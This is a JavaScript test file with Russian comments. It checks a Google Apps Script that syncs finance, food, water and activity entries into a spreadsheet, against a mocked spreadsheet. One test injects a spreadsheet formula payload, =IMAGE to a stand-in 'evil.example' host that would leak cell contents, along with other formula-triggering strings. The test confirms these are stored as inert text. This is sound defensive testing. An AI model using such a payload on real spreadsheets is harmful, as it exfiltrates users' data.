// Скрипт таблицы (dist/Code-RU.gs) на поддельной таблице: листы создаются, записи не дублируются, ключ запоминается
import fs from "fs"
const code = fs.readFileSync(new URL("../dist/Code-RU.gs", import.meta.url), "utf8")
class Sheet {
  constructor(name) { this.name = name; this.cells = []; this.formulas = {}; this.maxRows = 1000 }
  getName() { return this.name }
  getMaxRows() { return this.maxRows }
  getLastRow() { let n = 0; this.cells.forEach((r, i) => { if (r && r.some(v => v !== "" && v !== undefined)) n = i + 1 }); return n }
  getRange(r, c, nr = 1, nc = 1) {
    const sh = this, obj = {
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => (sh.cells[r - 1 + i] || [])[c - 1 + j] ?? "")),
      setValues: v => { v.forEach((row, i) => row.forEach((x, j) => { (sh.cells[r - 1 + i] ||= [])[c - 1 + j] = x })); return obj },
      setValue: x => obj.setValues([[x]]),
      setFormula: f => { sh.formulas[`${r},${c}`] = f; return obj },
      sort: ({ column }) => { const rows = obj.getValues(); rows.sort((a, b) => +a[column - c] - +b[column - c]); obj.setValues(rows); return obj },
    }
    for (const k of ["setFontWeight", "setBackground", "setFontColor", "setNumberFormat", "setFontSize", "merge", "setWrap"]) obj[k] = () => obj
    return obj
  }
  deleteRow(r) { this.cells.splice(r - 1, 1) }
  setFrozenRows() {} hideColumns() {} showColumns() {} setColumnWidth() {}
  getSheetId() { return sheets.indexOf(this) + 100 }
}
const sheets = [new Sheet("Лист1")]
const ss = { getSheetByName: n => sheets.find(s => s.name === n) || null, insertSheet: n => { const s = new Sheet(n); sheets.push(s); return s },
  getSheets: () => sheets, deleteSheet: s => sheets.splice(sheets.indexOf(s), 1), getName: () => "Мой день", getUrl: () => "https://docs.google.com/spreadsheets/d/T/edit",
  setActiveSheet: s => { ss.active = s }, moveActiveSheet: i => { sheets.splice(sheets.indexOf(ss.active), 1); sheets.splice(i - 1, 0, ss.active) },
  getSpreadsheetTimeZone: () => "Asia/Bangkok" }
const props = {}
const g = {
  SpreadsheetApp: { getActiveSpreadsheet: () => ss },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] ?? null, setProperty: (k, v) => { props[k] = v } }) },
  ContentService: { createTextOutput: s => ({ setMimeType: () => JSON.parse(s) }), MimeType: { JSON: 1 } },
}
const gs = new Function(...Object.keys(g), code + "; return { doPost, doGet, localFormula_ }")(...Object.values(g))
let fail = 0
const check = (name, ok, got) => { console.log(`${ok ? "✓" : "✗"} ${name}${ok ? "" : "  → " + JSON.stringify(got)}`); if (!ok) fail++ }
const post = b => gs.doPost({ postData: { contents: JSON.stringify(b) } })
const KEY = "k".repeat(32)
const t = new Date(2026, 9, 23, 12).getTime()
const body = { secret: KEY, deleted: [],
  entries: [{ id: "f1", date: t, type: "expense", amount: 500, method: "transfer", category: "Еда и продукты", comment: "Пятёрочка" }],
  food: [{ id: "m1", date: t, title: "Плов", kcal: 650, protein: 20, fat: 25, carbs: 80 }],
  water: [{ id: "w1", date: t, ml: 250 }, { id: "w2", date: t + 1000, ml: 300 }],
  health: [{ day: "2026-10-23", updated: t, steps: 7500, active: 410 }] }
let r = post(body)
check("первая запись", r.ok && r.added === 4 && r.url, r)
check("листы созданы, пустой Лист1 удалён", ["Операции", "Еда", "Вода", "Активность", "Итоги: еда", "Итоги: активность", "Итоги: вода", "Итоги: деньги"]
  .every(n => ss.getSheetByName(n)) && !ss.getSheetByName("Лист1"), sheets.map(s => s.name))
check("ключ запомнен", props.secret === KEY)
check("чужой ключ — отказ", post(Object.assign({}, body, { secret: "x".repeat(32) })).error === "forbidden")
r = post(body)
check("повтор не дублирует", r.added === 0 && ss.getSheetByName("Вода").getLastRow() === 3, r)
post(Object.assign({}, body, { health: [{ day: "2026-10-23", updated: t + 5000, steps: 9000, active: 520 }] }))
const act = ss.getSheetByName("Активность")
check("активность за день обновляется, а не дублируется", act.getLastRow() === 2 && act.cells[1][1] === 9000 && act.cells[1][2] === 520, act.cells)
r = post(Object.assign({}, body, { water: [body.water[0]], deleted: ["w2"] }))
check("удалённое убирается", r.removed === 1 && ss.getSheetByName("Вода").getLastRow() === 2, r)
check("итоги — формулы", Object.values(ss.getSheetByName("Итоги: деньги").formulas).length === 4 &&
  Object.values(ss.getSheetByName("Итоги: еда").formulas).every(f => f.startsWith("=QUERY(")))
const an = ss.getSheetByName("Еда и активность")
check("анализ еды — первым листом, номера листов в ответе", sheets[0] === an && r.sheets && r.sheets["Еда и активность"] === an.getSheetId(), r.sheets)
const cell = a1 => an.formulas[a1] ?? (an.cells[+a1.split(",")[0] - 1] || [])[+a1.split(",")[1] - 1]
check("цели в B3–B5, сегодня и неделя — формулы", cell("3,2") === 2000 && cell("4,2") === 100 && cell("5,2") === 2 &&
  /SUMIFS\('Еда'!C2:C/.test(cell("8,2")) && cell("9,2") === "=B3-B8" && /ROWS\(UNIQUE/.test(cell("14,2")) && /B14/.test(cell("15,2")))
check("рекомендации и топ блюд", /Белка в среднем/.test(cell("27,2")) && /шагов в день/.test(cell("31,2")) && /order by sum\(C\) desc limit 10/.test(cell("2,7")))
check("шаги сегодня и таблица по дням", cell("12,1") === "Шагов" && /'Активность'!A2:B, 2/.test(cell("12,2")) &&
  /SEQUENCE\(14/.test(cell("16,7")) && /Сожжено ккал/.test(cell("16,7")) && cell("15,7") === "Съедено и сожжено по дням")
check("подписи на своих строках", cell("21,1") === "Шагов в день" && cell("22,1") === "Воды в день, л" && cell("33,1") === "Совет Claude" && cell("35,1") === "Обновлено")
const ru = gs.localFormula_("ru_RU")
check("формулы под русскую локаль", ru("=IF(B3>B4*1.1, \"a, b\", ROUND(B5, 1))") === "=IF(B3>B4*1,1; \"a, b\"; ROUND(B5; 1))" &&
  ru("=QUERY({'Л'!A2:A, IF(B2:B=1, C2:C, 0)}, \"select Col1\", 0)") === "=QUERY({'Л'!A2:A\\ IF(B2:B=1; C2:C; 0)}; \"select Col1\"; 0)" &&
  gs.localFormula_("en_US")("=A(1.5, 2)") === "=A(1.5, 2)", ru("=IF(B3>B4*1.1, \"a, b\", ROUND(B5, 1))"))
r = post(Object.assign({}, body, { entries: [{ id: "f9", date: t, type: "expense", amount: 1, method: "cash", category: "Другое", comment: "=IMAGE(\"https://evil.example/?\"&A1)" }],
  food: [{ id: "m9", date: t, title: "@HYPERLINK(1)", kcal: 1 }, { id: "m10", date: t + 1, title: "-5 кг", kcal: 1 }], water: [] }))
const rowsOf = n => ss.getSheetByName(n).cells.flat().filter(v => typeof v === "string")
check("текст из виджета не становится формулой", rowsOf("Операции").includes("'=IMAGE(\"https://evil.example/?\"&A1)") &&
  rowsOf("Еда").includes("'@HYPERLINK(1)") && rowsOf("Еда").includes("'-5 кг") && rowsOf("Еда").includes("Плов"), rowsOf("Еда"))
const g0 = gs.doGet()
check("doGet без ключа не выдаёт таблицу", g0.ok && !g0.url && !g0.sheet, g0)
console.log(fail ? `GS_FAIL ${fail}` : "GS_OK")
process.exit(fail ? 1 : 0)
